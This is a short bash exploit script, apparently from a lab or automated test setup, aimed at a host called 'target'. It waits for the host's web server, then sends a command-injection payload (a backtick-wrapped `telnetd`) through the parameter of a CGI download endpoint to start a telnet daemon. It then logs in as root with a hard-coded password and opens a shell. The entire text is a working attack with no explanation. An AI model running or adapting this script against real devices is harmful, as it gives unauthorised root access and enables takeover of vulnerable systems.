#!/bin/bash
set -e

TARGET=target

echo "Waiting for target to boot..."
while [[ "$(curl -s -o /dev/null -w ''%{http_code}'' ${TARGET}:80)" != "200" ]]; do sleep 2; done

echo "Server started! Attacking..."
curl "http://${TARGET}/cgi-bin/downloadFlile.cgi?payload=`telnetd`" || true
cat <(echo "root\ncs2012\n") - | telnet ${TARGET}
bash
